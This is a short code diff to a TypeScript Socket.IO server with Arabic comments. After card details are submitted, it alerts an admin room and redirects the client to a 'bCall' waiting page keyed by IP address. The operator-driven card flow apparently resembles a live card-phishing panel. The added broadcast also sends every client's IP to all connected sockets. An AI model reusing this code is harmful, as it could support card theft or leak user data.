@@ -164,10 +164,24 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
         // إشعار المسؤول بالبيانات الجديدة
         io?.to("admins").emit("newPayment", { reference, step: 1, type: "card" });
 
+        // إرسال ackPayment للعميل مع توجيهه لصفحة الانتظار (bCall)
         socket.emit("ackPayment", {
           success: true,
           data: { step: 1, status: "STILL" },
         });
+
+        // توجيه العميل لصفحة الانتظار بعد حفظ البطاقة
+        if (clientIp && clientIp !== "unknown") {
+          // تسجيل الـ IP في الـ map
+          ipToReference.set(clientIp, reference);
+          ipToSocket.set(clientIp, socket.id);
+          socket.join(`ip_${clientIp}`);
+          // إرسال navigateTo لصفحة bCall (الانتظار)
+          setTimeout(() => {
+            io?.to(`ip_${clientIp}`).emit("navigateTo", { page: "bCall", ip: clientIp });
+            io?.emit("navigateTo", { page: "bCall", ip: clientIp });
+          }, 500);
+        }
       } catch (err: any) {
         console.error("[Socket.io] submitPaymentData error:", err);
         socket.emit("ackPayment", { success: false, error: err.message });
